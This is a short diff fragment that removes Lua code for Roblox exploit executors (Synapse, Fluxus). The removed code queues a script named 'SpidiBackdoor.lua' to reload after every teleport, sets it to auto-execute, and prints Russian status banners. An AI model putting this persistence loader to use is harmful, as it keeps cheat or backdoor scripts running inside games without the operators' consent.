-    local queueteleport = syn and syn.queue_on_teleport or queue_on_teleport or fluxus and fluxus.queue_on_teleport
-    if queueteleport then
-        queueteleport("loadfile('SpidiBackdoor.lua')()")
-        print("[Spidi] ✅ queue_on_teleport сработал")
-        return true
-    end
-    return false
-end
-
-print("[Spidi] ========================================")
-print("[Spidi] 🚀 Spidi V16 (БЕЗ ГИТХАБА)")
-print("[Spidi] ========================================")
-
-saveScript()
-autoExecute()
-loadfile("SpidiBackdoor.lua")()
